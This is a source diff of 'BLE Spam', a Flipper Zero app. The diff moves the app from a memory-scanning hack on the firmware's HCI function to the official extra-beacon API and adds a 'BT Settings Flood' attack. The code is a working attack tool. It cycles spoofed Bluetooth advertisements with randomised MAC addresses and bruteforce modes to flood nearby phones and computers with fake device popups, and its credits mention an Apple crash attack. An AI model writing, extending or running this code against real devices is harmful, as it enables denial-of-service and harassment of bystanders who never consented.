@@ -1,192 +1,14 @@
 #include "ble_spam.h"
 #include <gui/gui.h>
-#include <gui/elements.h>
 #include <furi_hal_bt.h>
-#include <stdint.h>
-#include <furi_hal_random.h>
+#include <extra_beacon.h>
+#include <gui/elements.h>
+
 #include "protocols/_protocols.h"
 
 #include <ble_spam_icons.h>
 #include <notification/notification.h>
 #include <notification/notification_messages.h>
-
-// NAPI
-// TODO: Use __attribute__((aligned(2))) instead?
-// TODO: Use an offset of the base address?
-
-#define TAG "FuriHalBt"
-#define BLE_STATUS_TIMEOUT 0xFFU
-#define BLE_CMD_MAX_PARAM_LEN 255
-
-typedef uint8_t tBleStatus;
-
-typedef __PACKED_STRUCT {
-    uint8_t Adv_Data_Length;
-    uint8_t Adv_Data[BLE_CMD_MAX_PARAM_LEN - 1];
-}
-aci_gap_additional_beacon_set_data_cp0;
-
-typedef __PACKED_STRUCT {
-    uint16_t Adv_Interval_Min;
-    uint16_t Adv_Interval_Max;
-    uint8_t Adv_Channel_Map;
-    uint8_t Own_Address_Type;
-    uint8_t Own_Address[6];
-    uint8_t PA_Level;
-}
-aci_gap_additional_beacon_start_cp0;
-
-struct hci_request {
-    uint16_t ogf;
-    uint16_t ocf;
-    int event;
-    void* cparam;
-    int clen;
-    void* rparam;
-    int rlen;
-};
-
-#define HCI_SEND_REQ_ADDR 0x080161e8
-#define TARGET_SEQUENCE 0x33680446
-#define SEQUENCE_OFFSET 6
-#define START_ADDR 0x8000140
-#define END_ADDR 0x80800ec
-
-uintptr_t* scan_memory_for_sequence(uint32_t sequence) {
-    uint8_t* addr;
-    uint8_t* target_bytes = (uint8_t*)&sequence;
-
-    for(addr = (uint8_t*)START_ADDR; addr < (uint8_t*)END_ADDR - 3; addr++) {
-        if(addr[0] == target_bytes[3] && addr[1] == target_bytes[2] &&
-           addr[2] == target_bytes[1] && addr[3] == target_bytes[0]) {
-            return (uintptr_t*)(addr - SEQUENCE_OFFSET);
-        }
-    }
-    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to latest OFW offset
-}
-
-int (*napi_hci_send_req)(struct hci_request* p_cmd, uint8_t async) = NULL;
-
-void* Osal_MemCpy(void* dest, const void* src, unsigned int size) {
-    return memcpy(dest, src, size);
-}
-
-void* Osal_MemSet(void* ptr, int value, unsigned int size) {
-    return memset(ptr, value, size);
-}
-
-tBleStatus aci_gap_additional_beacon_start(
-    uint16_t Adv_Interval_Min,
-    uint16_t Adv_Interval_Max,
-    uint8_t Adv_Channel_Map,
-    uint8_t Own_Address_Type,
-    const uint8_t* Own_Address,
-    uint8_t PA_Level) {
-    struct hci_request rq;
-    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
-    aci_gap_additional_beacon_start_cp0* cp0 = (aci_gap_additional_beacon_start_cp0*)(cmd_buffer);
-    tBleStatus status = 0;
-    int index_input = 0;
-    cp0->Adv_Interval_Min = Adv_Interval_Min;
-    index_input += 2;
-    cp0->Adv_Interval_Max = Adv_Interval_Max;
-    index_input += 2;
-    cp0->Adv_Channel_Map = Adv_Channel_Map;
-    index_input += 1;
-    cp0->Own_Address_Type = Own_Address_Type;
-    index_input += 1;
-    Osal_MemCpy((void*)&cp0->Own_Address, (const void*)Own_Address, 6);
-    index_input += 6;
-    cp0->PA_Level = PA_Level;
-    index_input += 1;
-    Osal_MemSet(&rq, 0, sizeof(rq));
-    rq.ogf = 0x3f;
-    rq.ocf = 0x0b0;
-    rq.cparam = cmd_buffer;
-    rq.clen = index_input;
-    rq.rparam = &status;
-    rq.rlen = 1;
-    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
-    return status;
-}
-
-tBleStatus aci_gap_additional_beacon_stop(void) {
-    struct hci_request rq;
-    tBleStatus status = 0;
-    Osal_MemSet(&rq, 0, sizeof(rq));
-    rq.ogf = 0x3f;
-    rq.ocf = 0x0b1;
-    rq.rparam = &status;
-    rq.rlen = 1;
-    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
-    return status;
-}
-
-tBleStatus aci_gap_additional_beacon_set_data(uint8_t Adv_Data_Length, const uint8_t* Adv_Data) {
-    struct hci_request rq;
-    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
-    aci_gap_additional_beacon_set_data_cp0* cp0 =
-        (aci_gap_additional_beacon_set_data_cp0*)(cmd_buffer);
-    tBleStatus status = 0;
-    int index_input = 0;
-    cp0->Adv_Data_Length = Adv_Data_Length;
-    index_input += 1;
-    Osal_MemCpy((void*)&cp0->Adv_Data, (const void*)Adv_Data, Adv_Data_Length);
-    index_input += Adv_Data_Length;
-    Osal_MemSet(&rq, 0, sizeof(rq));
-    rq.ogf = 0x3f;
-    rq.ocf = 0x0b2;
-    rq.cparam = cmd_buffer;
-    rq.clen = index_input;
-    rq.rparam = &status;
-    rq.rlen = 1;
-    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
-    return status;
-}
-
-bool napi_furi_hal_bt_custom_adv_set(const uint8_t* adv_data, size_t adv_len) {
-    tBleStatus status = aci_gap_additional_beacon_set_data(adv_len, adv_data);
-    if(status) {
-        FURI_LOG_E(TAG, "custom_adv_set failed %d", status);
-        return false;
-    } else {
-        FURI_LOG_D(TAG, "custom_adv_set success");
-        return true;
-    }
-}
-
-bool napi_furi_hal_bt_custom_adv_start(
-    uint16_t min_interval,
-    uint16_t max_interval,
-    uint8_t mac_type,
-    const uint8_t mac_addr[GAP_MAC_ADDR_SIZE],
-    uint8_t power_amp_level) {
-    tBleStatus status = aci_gap_additional_beacon_start(
-        (double)(min_interval / 0.625), // Millis to gap time
-        (double)(max_interval / 0.625), // Millis to gap time
-        0b00000111, // All 3 channels
-        mac_type,
-        mac_addr,
-        power_amp_level);
-    if(status) {
-        FURI_LOG_E(TAG, "custom_adv_start failed %d", status);
-        return false;
-    } else {
-        FURI_LOG_D(TAG, "custom_adv_start success");
-        return true;
-    }
-}
-
-bool napi_furi_hal_bt_custom_adv_stop() {
-    tBleStatus status = aci_gap_additional_beacon_stop();
-    if(status) {
-        FURI_LOG_E(TAG, "custom_adv_stop failed %d", status);
-        return false;
-    } else {
-        FURI_LOG_D(TAG, "custom_adv_stop success");
-        return true;
-    }
-}
 
 // Hacked together by @Willy-JL
 // Custom adv API by @Willy-JL (idea by @xMasterX)
@@ -204,6 +26,16 @@ static Attack attacks[] = {
             {
                 .random_mac = true,
                 .cfg = {},
+            },
+    },
+    {
+        .title = "BT Settings Flood",
+        .text = "Fills available BT devices",
+        .protocol = &protocol_nameflood,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg.nameflood = {},
             },
     },
     {
@@ -321,7 +153,7 @@ static Attack attacks[] = {
 
 #define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
 
-static uint16_t delays[] = {20, 50, 100, 200};
+static uint16_t delays[] = {20, 50, 100, 200, 500};
 
 typedef struct {
     Ctx ctx;
@@ -330,9 +162,9 @@ typedef struct {
     uint8_t lock_count;
     FuriTimer* lock_timer;
 
-    bool resume;
     bool advertising;
     uint8_t delay;
+    GapExtraBeaconConfig config;
     FuriThread* thread;
     int8_t index;
     bool ignore_bruteforce;
@@ -358,61 +190,116 @@ const NotificationSequence blink_sequence = {
     NULL,
 };
 static void start_blink(State* state) {
+    if(!state->ctx.led_indicator) return;
     uint16_t period = delays[state->delay];
     if(period <= 100) period += 30;
     blink_message.data.led_blink.period = period;
     notification_message_block(state->ctx.notification, &blink_sequence);
 }
 static void stop_blink(State* state) {
+    if(!state->ctx.led_indicator) return;
     notification_message_block(state->ctx.notification, &sequence_blink_stop);
+}
+
+static void randomize_mac(State* state) {
+    furi_hal_random_fill_buf(state->config.address, sizeof(state->config.address));
+}
+
+static void start_extra_beacon(State* state) {
+    uint8_t size;
+    uint8_t* packet;
+    uint16_t delay = delays[state->delay];
+    GapExtraBeaconConfig* config = &state->config;
+    Payload* payload = &attacks[state->index].payload;
+    const Protocol* protocol = attacks[state->index].protocol;
+
+    config->min_adv_interval_ms = delay;
+    config->max_adv_interval_ms = delay * 1.5;
+    if(payload->random_mac) randomize_mac(state);
+    furi_check(furi_hal_bt_extra_beacon_set_config(config));
+
+    if(protocol) {
+        protocol->make_packet(&size, &packet, payload);
+    } else {
+        protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
+    }
+    furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
+    free(packet);
+
+    furi_check(furi_hal_bt_extra_beacon_start());
 }
 
 static int32_t adv_thread(void* _ctx) {
     State* state = _ctx;
-    uint8_t size;
-    uint16_t delay;
-    uint8_t* packet;
-    uint8_t mac[GAP_MAC_ADDR_SIZE];
     Payload* payload = &attacks[state->index].payload;
     const Protocol* protocol = attacks[state->index].protocol;
-    if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
-    if(state->ctx.led_indicator) start_blink(state);
-
-    while(state->advertising) {
-        if(protocol) {
-            if(payload->mode == PayloadModeBruteforce && payload->bruteforce.counter++ >= 10) {
-                payload->bruteforce.counter = 0;
-                payload->bruteforce.value =
-                    (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
-            }
-            protocol->make_packet(&size, &packet, payload);
-        } else {
-            protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
-        }
-        napi_furi_hal_bt_custom_adv_set(packet, size);
-        free(packet);
-
-        if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
-        delay = delays[state->delay];
-        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
-        furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
-        napi_furi_hal_bt_custom_adv_stop();
+    if(!payload->random_mac) randomize_mac(state);
+    start_blink(state);
+    if(furi_hal_bt_extra_beacon_is_active()) {
+        furi_check(furi_hal_bt_extra_beacon_stop());
     }
 
-    if(state->ctx.led_indicator) stop_blink(state);
+    while(state->advertising) {
+        if(protocol && payload->mode == PayloadModeBruteforce &&
+           payload->bruteforce.counter++ >= 10) {
+            payload->bruteforce.counter = 0;
+            payload->bruteforce.value =
+                (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
+        }
+
+        start_extra_beacon(state);
+
+        furi_thread_flags_wait(true, FuriFlagWaitAny, delays[state->delay]);
+        furi_check(furi_hal_bt_extra_beacon_stop());
+    }
+
+    stop_blink(state);
     return 0;
 }
+
+//static int32_t adv_thread2(void* _ctx) {
+//    State* state = _ctx;
+//    uint8_t size;
+//    uint16_t delay;
+//    uint8_t* packet;
+//    uint8_t mac[GAP_MAC_ADDR_SIZE];
+//    Payload* payload = &attacks[state->index].payload;
+//    const Protocol* protocol = attacks[state->index].protocol;
+//    if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
+//    if(state->ctx.led_indicator) start_blink(state);
+//
+//    while(state->advertising) {
+//        if(protocol) {
+//            if(payload->mode == PayloadModeBruteforce && payload->bruteforce.counter++ >= 10) {
+//                payload->bruteforce.counter = 0;
+//                payload->bruteforce.value =
+//                    (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
+//            }
+//            protocol->make_packet(&size, &packet, payload);
+//        } else {
+//            protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
+//        }
+//        napi_furi_hal_bt_custom_adv_set(packet, size);
+//        free(packet);
+//
+//        if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
+//        delay = delays[state->delay];
+//        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
+//        furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
+//        napi_furi_hal_bt_custom_adv_stop();
+//    }
+//
+//    if(state->ctx.led_indicator) stop_blink(state);
+//    return 0;
+//}
 
 static void toggle_adv(State* state) {
     if(state->advertising) {
         state->advertising = false;
         furi_thread_flags_set(furi_thread_get_id(state->thread), true);
         furi_thread_join(state->thread);
-        if(state->resume) furi_hal_bt_start_advertising();
     } else {
         state->advertising = true;
-        state->resume = furi_hal_bt_is_active();
-        furi_hal_bt_stop_advertising();
         furi_thread_start(state->thread);
     }
 }
@@ -459,7 +346,8 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
     const Protocol* protocol = attack ? attack->protocol : NULL;
 
     canvas_set_font(canvas, FontSecondary);
-    canvas_draw_icon(canvas, 4 - !protocol, 3, protocol ? protocol->icon : &I_ble_spam);
+    const Icon* icon = protocol ? protocol->icon : &I_ble_spam;
+    canvas_draw_icon(canvas, 4 - (icon == &I_ble_spam), 3, icon);
     canvas_draw_str(canvas, 14, 12, "BLE Spam");
 
     switch(state->index) {
@@ -540,7 +428,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
             AlignLeft,
             AlignTop,
             "See \e#more info\e# and change\n"
-            "\e#attack options\e# by holding\n"
+            "attack \e#options\e# by holding\n"
             "Ok on each attack page",
             false);
         break;
@@ -555,10 +443,10 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
             48,
             AlignLeft,
             AlignTop,
-            "App+Spam: \e#WillyJL\e# XFW\n"
+            "App+Spam: \e#WillyJL\e# MNTM\n"
             "Apple+Crash: \e#ECTO-1A\e#\n"
             "Android+Win: \e#Spooks4576\e#\n"
-            "                                   Version \e#4.3\e#",
+            "                                   Version \e#" FAP_VERSION "\e#",
             false);
         break;
     default: {
@@ -581,8 +469,8 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
             snprintf(str, sizeof(str), "%ims", delays[state->delay]);
         }
         canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
-        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
-        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);
+        canvas_draw_icon(canvas, 119, 6, &I_Int_SmallArrowUp_3x5);
+        canvas_draw_icon(canvas, 119, 10, &I_Int_SmallArrowDown_3x5);
 
         canvas_set_font(canvas, FontPrimary);
         if(payload->mode == PayloadModeBruteforce) {
@@ -607,11 +495,11 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
                 state->index + 1,
                 ATTACKS_COUNT,
                 protocol ? protocol->get_name(payload) : "Everything AND");
-            canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);
+            canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 22, str);
         }
 
         canvas_set_font(canvas, FontPrimary);
-        canvas_draw_str(canvas, 4, 35, attack->title);
+        canvas_draw_str(canvas, 4, 33, attack->title);
 
         canvas_set_font(canvas, FontSecondary);
         canvas_draw_str(canvas, 4, 46, attack->text);
@@ -632,10 +520,10 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
         canvas_set_font(canvas, FontSecondary);
         elements_bold_rounded_frame(canvas, 14, 8, 99, 48);
         elements_multiline_text(canvas, 65, 26, "To unlock\npress:");
-        canvas_draw_icon(canvas, 65, 42, &I_Pin_back_arrow_10x8);
-        canvas_draw_icon(canvas, 80, 42, &I_Pin_back_arrow_10x8);
-        canvas_draw_icon(canvas, 95, 42, &I_Pin_back_arrow_10x8);
-        canvas_draw_icon(canvas, 16, 13, &I_WarningDolphin_45x42);
+        canvas_draw_icon(canvas, 65, 42, &I_Int_Pin_back_arrow_10x8);
+        canvas_draw_icon(canvas, 80, 42, &I_Int_Pin_back_arrow_10x8);
+        canvas_draw_icon(canvas, 95, 42, &I_Int_Pin_back_arrow_10x8);
+        canvas_draw_icon(canvas, 16, 13, &I_Int_WarningDolphin_45x42);
         canvas_draw_dot(canvas, 17, 61);
     }
 }
@@ -647,15 +535,16 @@ static bool input_callback(InputEvent* input, void* _ctx) {
 
     if(state->ctx.lock_keyboard) {
         consumed = true;
-        with_view_model(
-            state->main_view, State * *model, { (*model)->lock_warning = true; }, true);
+        state->lock_warning = true;
         if(state->lock_count == 0) {
+            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
             furi_timer_start(state->lock_timer, 1000);
         }
         if(input->type == InputTypeShort && input->key == InputKeyBack) {
             state->lock_count++;
         }
         if(state->lock_count >= 3) {
+            furi_timer_set_thread_priority(FuriTimerThreadPriorityElevated);
             furi_timer_start(state->lock_timer, 1);
         }
     } else if(
@@ -674,7 +563,9 @@ static bool input_callback(InputEvent* input, void* _ctx) {
                     if(advertising) toggle_adv(state);
                     state->ctx.attack = &attacks[state->index];
                     scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
+                    view_commit_model(view, consumed);
                     scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
+                    return consumed;
                 } else if(input->type == InputTypeShort) {
                     toggle_adv(state);
                 }
@@ -717,29 +608,21 @@ static bool input_callback(InputEvent* input, void* _ctx) {
                 }
             } else {
                 if(!advertising) {
-                    bool resume = furi_hal_bt_is_active();
-                    furi_hal_bt_stop_advertising();
                     Payload* payload = &attacks[state->index].payload;
-                    const Protocol* protocol = attacks[state->index].protocol;
+                    if(input->type == InputTypeLong && !payload->random_mac) randomize_mac(state);
+                    if(furi_hal_bt_extra_beacon_is_active()) {
+                        furi_check(furi_hal_bt_extra_beacon_stop());
+                    }
 
-                    uint8_t size;
-                    uint8_t* packet;
-                    protocol->make_packet(&size, &packet, payload);
-                    napi_furi_hal_bt_custom_adv_set(packet, size);
-                    free(packet);
+                    start_extra_beacon(state);
 
-                    uint8_t mac[GAP_MAC_ADDR_SIZE];
-                    furi_hal_random_fill_buf(mac, sizeof(mac));
-                    uint16_t delay = delays[state->delay];
-                    napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
                     if(state->ctx.led_indicator)
                         notification_message(state->ctx.notification, &solid_message);
                     furi_delay_ms(10);
-                    napi_furi_hal_bt_custom_adv_stop();
+                    furi_check(furi_hal_bt_extra_beacon_stop());
 
                     if(state->ctx.led_indicator)
                         notification_message_block(state->ctx.notification, &sequence_reset_rgb);
-                    if(resume) furi_hal_bt_start_advertising();
                 }
             }
             break;
@@ -779,9 +662,14 @@ static void lock_timer_callback(void* _ctx) {
     } else {
         state->ctx.lock_keyboard = false;
     }
-    with_view_model(
-        state->main_view, State * *model, { (*model)->lock_warning = false; }, true);
+    with_view_model(state->main_view, State * *model, { (*model)->lock_warning = false; }, true);
     state->lock_count = 0;
+    furi_timer_set_thread_priority(FuriTimerThreadPriorityNormal);
+}
+
+static bool custom_event_callback(void* _ctx, uint32_t event) {
+    State* state = _ctx;
+    return scene_manager_handle_custom_event(state->ctx.scene_manager, event);
 }
 
 static void tick_event_callback(void* _ctx) {
@@ -799,29 +687,39 @@ static bool back_event_callback(void* _ctx) {
 
 int32_t ble_spam(void* p) {
     UNUSED(p);
-    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
-        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);
+    GapExtraBeaconConfig prev_cfg;
+    const GapExtraBeaconConfig* prev_cfg_ptr = furi_hal_bt_extra_beacon_get_config();
+    if(prev_cfg_ptr) {
+        memcpy(&prev_cfg, prev_cfg_ptr, sizeof(prev_cfg));
+    }
+    uint8_t prev_data[EXTRA_BEACON_MAX_DATA_SIZE];
+    uint8_t prev_data_len = furi_hal_bt_extra_beacon_get_data(prev_data);
+    bool prev_active = furi_hal_bt_extra_beacon_is_active();
+
     State* state = malloc(sizeof(State));
+    state->config.adv_channel_map = GapAdvChannelMapAll;
+    state->config.adv_power_level = GapAdvPowerLevel_6dBm;
+    state->config.address_type = GapAddressTypePublic;
     state->thread = furi_thread_alloc();
     furi_thread_set_callback(state->thread, adv_thread);
     furi_thread_set_context(state->thread, state);
-    furi_thread_set_stack_size(state->thread, 4096);
+    furi_thread_set_stack_size(state->thread, 2048);
     state->ctx.led_indicator = true;
     state->lock_timer = furi_timer_alloc(lock_timer_callback, FuriTimerTypeOnce, state);
 
     state->ctx.notification = furi_record_open(RECORD_NOTIFICATION);
     Gui* gui = furi_record_open(RECORD_GUI);
     state->ctx.view_dispatcher = view_dispatcher_alloc();
-    view_dispatcher_enable_queue(state->ctx.view_dispatcher);
+
     view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, state);
+    view_dispatcher_set_custom_event_callback(state->ctx.view_dispatcher, custom_event_callback);
     view_dispatcher_set_tick_event_callback(state->ctx.view_dispatcher, tick_event_callback, 100);
     view_dispatcher_set_navigation_event_callback(state->ctx.view_dispatcher, back_event_callback);
     state->ctx.scene_manager = scene_manager_alloc(&scene_handlers, &state->ctx);
 
     state->main_view = view_alloc();
     view_allocate_model(state->main_view, ViewModelTypeLocking, sizeof(State*));
-    with_view_model(
-        state->main_view, State * *model, { *model = state; }, false);
+    with_view_model(state->main_view, State * *model, { *model = state; }, false);
     view_set_context(state->main_view, state->main_view);
     view_set_draw_callback(state->main_view, draw_callback);
     view_set_input_callback(state->main_view, input_callback);
@@ -872,5 +770,16 @@ int32_t ble_spam(void* p) {
     furi_timer_free(state->lock_timer);
     furi_thread_free(state->thread);
     free(state);
+
+    if(furi_hal_bt_extra_beacon_is_active()) {
+        furi_check(furi_hal_bt_extra_beacon_stop());
+    }
+    if(prev_cfg_ptr) {
+        furi_check(furi_hal_bt_extra_beacon_set_config(&prev_cfg));
+    }
+    furi_check(furi_hal_bt_extra_beacon_set_data(prev_data, prev_data_len));
+    if(prev_active) {
+        furi_check(furi_hal_bt_extra_beacon_start());
+    }
     return 0;
 }
